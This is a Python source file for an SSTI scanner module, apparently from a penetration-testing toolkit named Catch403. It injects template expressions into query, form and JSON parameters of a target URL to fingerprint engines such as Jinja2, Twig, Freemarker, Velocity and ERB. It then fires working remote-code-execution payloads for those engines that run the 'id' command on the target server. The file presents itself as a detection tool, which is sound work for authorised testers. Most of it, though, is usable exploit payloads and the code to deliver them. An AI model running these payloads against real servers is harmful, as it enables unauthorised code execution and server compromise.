#!/usr/bin/python3
"""
SSTI Scanner — Server-Side Template Injection detection.

Detection strategy:
  1. Math probe: inject {{7*7}}, ${7*7}, #{7*7}, etc. and look for "49" in response
  2. String probe: inject string operations and look for known-good output
  3. Engine fingerprinting: Jinja2, Twig, Freemarker, Mako, Smarty, Pebble, Handlebars, ERB
  4. RCE confirmation payloads once engine is identified

Tests all query string parameters and POST fields.

Usage:
  ../.venv/bin/python3 modules/ssti_scanner.py -u "https://target.com/render?name=test"
  ../.venv/bin/python3 modules/ssti_scanner.py -u https://target.com/greet -d "name=test" --post
  ../.venv/bin/python3 modules/ssti_scanner.py -u https://target.com -p template,msg,name
"""
import argparse
import json
import re
import urllib.parse

import requests
import urllib3

from core.colors import bold, end, good, bad, info, run

urllib3.disable_warnings()

TIMEOUT = 15
UA      = {"User-Agent": "Catch403/1.0"}

# ── detection payloads ─────────────────────────────────────────────────────
# Each entry: (payload, expected_output_regex, engine_hint, severity)

DETECTION_PAYLOADS: list[tuple[str, str, str, str]] = [
    # --- Math probe (engine-agnostic) ---
    ("{{7*7}}",             r"49",           "Jinja2/Twig",     "high"),
    ("${7*7}",              r"49",           "Freemarker/Mako", "high"),
    ("#{7*7}",              r"49",           "Ruby ERB",        "high"),
    ("{7*7}",               r"49",           "Smarty",          "high"),
    ("<%=7*7%>",            r"49",           "ERB/EJS",         "high"),
    ("${{7*7}}",            r"49",           "Pebble/Jinja2",   "high"),
    ("{{{7*7}}}",           r"49",           "Handlebars",      "high"),
    ("{{=7*7}}",            r"49",           "Pebble/Latte",    "high"),
    # Detect by multiply-string (Jinja2 specific: "a"*5 = "aaaaa")
    ('{{"catch403"*2}}',    r"catch403catch403", "Jinja2",      "high"),
    # Freemarker: numeric op
    ("${\"freemarker\"?upper_case}", r"FREEMARKER", "Freemarker", "high"),
    # Twig: string filter
    ('{{"twig"|upper}}',    r"TWIG",         "Twig",            "high"),
    # Smarty: smarty tag
    ("{$smarty.version}",   r"[0-9]+\.[0-9]+", "Smarty",       "high"),
    # Velocity
    ("#set($x=7*7)${x}",   r"49",           "Velocity",        "high"),
    # OGNL (Struts)
    ("%{7*7}",              r"49",           "OGNL/Struts",     "high"),
    # Nunjucks (Node.js)
    ("{{range(0,7)|list}}",  r"\[0, 1, 2",   "Nunjucks",       "medium"),
    # Mustache (no code exec by design, but detect reflection)
    ("{{catch403_probe}}",  r"catch403_probe|",  "Mustache",   "low"),
]

# RCE confirmation payloads per engine (only sent after engine identified)
RCE_PAYLOADS: dict[str, list[tuple[str, str]]] = {
    "Jinja2": [
        ('{{config.__class__.__init__.__globals__["os"].popen("id").read()}}',
         r"uid="),
        ('{{"".__class__.__mro__[1].__subclasses__()[<N>].__init__.__globals__["os"].popen("id").read()}}',
         r"uid="),
        ("{{lipsum.__globals__.os.popen('id').read()}}",
         r"uid="),
        ("{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}",
         r"uid="),
    ],
    "Twig": [
        ('{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}',
         r"uid="),
        ('{{["id"]|map("system")|join}}',
         r"uid="),
    ],
    "Freemarker": [
        ('<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}',
         r"uid="),
        ('${7777+7777}',
         r"15554"),
    ],
    "Velocity": [
        ('#set($str=$class.inspect("java.lang.Runtime").type)#set($rt=$str.getRuntime())#set($proc=$rt.exec("id"))#set($ist=$proc.inputStream)#set($reader=($class.inspect("java.io.InputStreamReader").type.getDeclaredConstructors()[0].newInstance([$ist])))#set($st=($class.inspect("java.io.BufferedReader").type.getDeclaredConstructors()[0].newInstance([$reader])))#set($lines=$st.readLines())$lines',
         r"uid="),
    ],
    "ERB": [
        ("<%= `id` %>",           r"uid="),
        ('<%= IO.popen("id").readlines() %>', r"uid="),
    ],
}


# ── helpers ────────────────────────────────────────────────────────────────

def _inject(base_url: str, param: str, payload: str) -> str:
    p = urllib.parse.urlparse(base_url)
    qs = urllib.parse.parse_qs(p.query, keep_blank_values=True)
    qs[param] = [payload]
    return p._replace(query=urllib.parse.urlencode(qs, doseq=True)).geturl()


def _send_get(url: str, param: str, payload: str, headers: dict) -> requests.Response | None:
    try:
        target = _inject(url, param, payload)
        return requests.get(target, headers=headers, timeout=TIMEOUT,
                            verify=False, allow_redirects=True)
    except Exception:
        return None


def _send_post(url: str, param: str, payload: str, headers: dict,
               existing_data: dict | None = None) -> requests.Response | None:
    try:
        data = dict(existing_data or {})
        data[param] = payload
        return requests.post(url, data=data, headers=headers, timeout=TIMEOUT,
                             verify=False, allow_redirects=True)
    except Exception:
        return None


def _send_json_post(url: str, param: str, payload: str, headers: dict,
                    existing_data: dict | None = None) -> requests.Response | None:
    try:
        data = dict(existing_data or {})
        data[param] = payload
        return requests.post(url, json=data,
                             headers={**headers, "Content-Type": "application/json"},
                             timeout=TIMEOUT, verify=False, allow_redirects=True)
    except Exception:
        return None


def _check_reflection(r: requests.Response | None, payload: str,
                      expected_re: str) -> bool:
    if r is None:
        return False
    # First check raw reflection (no execution)
    if payload in r.text:
        return False   # reflected as-is, not executed
    try:
        return bool(re.search(expected_re, r.text))
    except re.error:
        return payload in r.text


# ── scan ──────────────────────────────────────────────────────────────────

def scan_param(url: str, param: str, *,
               post: bool = False,
               json_post: bool = False,
               post_data: dict | None = None,
               headers: dict | None = None) -> list[dict]:
    hdrs = {**UA, **(headers or {})}
    findings: list[dict] = []
    detected_engines: set[str] = set()

    def _send(payload: str) -> requests.Response | None:
        if json_post:
            return _send_json_post(url, param, payload, hdrs, post_data)
        if post:
            return _send_post(url, param, payload, hdrs, post_data)
        return _send_get(url, param, payload, hdrs)

    for payload, expected_re, engine_hint, severity in DETECTION_PAYLOADS:
        r = _send(payload)
        if _check_reflection(r, payload, expected_re):
            findings.append({
                "name": f"SSTI Detected — {engine_hint}",
                "severity": severity,
                "detail": (
                    f"Template expression executed: '{payload}' → matched '{expected_re}'\n"
                    f"Engine hint: {engine_hint}\n"
                    f"Parameter: {param}"
                ),
                "url": url,
                "param": param,
                "payload": payload,
                "evidence": (r.text[:400] if r else ""),
            })
            for e in engine_hint.split("/"):
                detected_engines.add(e.strip())

    # RCE confirmation for identified engines
    for engine in detected_engines:
        rce_list = RCE_PAYLOADS.get(engine, [])
        for rce_payload, rce_re in rce_list:
            r = _send(rce_payload)
            if _check_reflection(r, rce_payload, rce_re):
                findings.append({
                    "name": f"SSTI RCE Confirmed — {engine}",
                    "severity": "critical",
                    "detail": (
                        f"Remote code execution via SSTI confirmed.\n"
                        f"Engine: {engine}\n"
                        f"Payload: {rce_payload}\n"
                        f"Response matched: {rce_re}"
                    ),
                    "url": url,
                    "param": param,
                    "payload": rce_payload,
                    "evidence": (r.text[:400] if r else ""),
                })
                break  # one confirmed RCE per engine is enough

    return findings


def scan(url: str, *,
         params: list[str] | None = None,
         post: bool = False,
         json_post: bool = False,
         post_data: dict | None = None,
         headers: dict | None = None) -> list[dict]:
    parsed = urllib.parse.urlparse(url)
    qs_params = list(urllib.parse.parse_qs(parsed.query).keys())
    target_params = params or qs_params

    if not target_params and post and post_data:
        target_params = list(post_data.keys())

    if not target_params:
        # Probe a few common param names
        target_params = ["name", "template", "msg", "message", "subject",
                         "content", "text", "title", "body", "input"]

    all_findings: list[dict] = []
    for param in target_params:
        all_findings.extend(scan_param(
            url, param, post=post, json_post=json_post,
            post_data=post_data, headers=headers,
        ))

    if not all_findings:
        all_findings.append({
            "name": "No SSTI Detected",
            "severity": "info",
            "detail": f"Tested {len(target_params)} parameter(s) — no SSTI indicators found",
        })
    return all_findings


# ── CLI ───────────────────────────────────────────────────────────────────

def main():
    parser = argparse.ArgumentParser(description="Catch403 SSTI Scanner")
    parser.add_argument("-u", dest="url", required=True)
    parser.add_argument("-p", dest="params", default="",
                        help="Comma-separated params to test (default: auto-detect from URL)")
    parser.add_argument("-d", dest="data", default="",
                        help="POST form body (param1=val1&param2=val2)")
    parser.add_argument("--post",    action="store_true", help="POST form mode")
    parser.add_argument("--json",    action="store_true", help="POST JSON body mode")
    parser.add_argument("--header", dest="headers", action="append", default=[],
                        metavar="NAME:VALUE")
    parser.add_argument("-o", dest="output", default="")
    args = parser.parse_args()

    custom_headers: dict = {}
    for h in args.headers:
        if ":" in h:
            k, v = h.split(":", 1)
            custom_headers[k.strip()] = v.strip()

    post_data: dict = {}
    if args.data:
        post_data = dict(urllib.parse.parse_qsl(args.data))

    params = [p.strip() for p in args.params.split(",") if p.strip()] or None

    _p = urllib.parse.urlparse(args.url)
    print(f"{run} SSTI scan: {bold}{_p.netloc}{_p.path}{end}")

    results = scan(
        args.url, params=params,
        post=args.post or args.json,
        json_post=args.json,
        post_data=post_data,
        headers=custom_headers,
    )

    for f in results:
        sev = f.get("severity", "info")
        icon = bad if sev in ("critical",) else (f"{bold}[{sev.upper()}]{end}" if sev != "info" else info)
        print(f"\n{icon} {bold}{f['name']}{end}")
        print(f"      {f.get('detail', '')[:160]}")
        if f.get("evidence"):
            print(f"      Evidence: {f['evidence'][:80]}")

    if args.output:
        with open(args.output, "w") as fh:
            json.dump(results, fh, indent=2)
        print(f"\n{good} Saved to {args.output}")


if __name__ == "__main__":
    main()
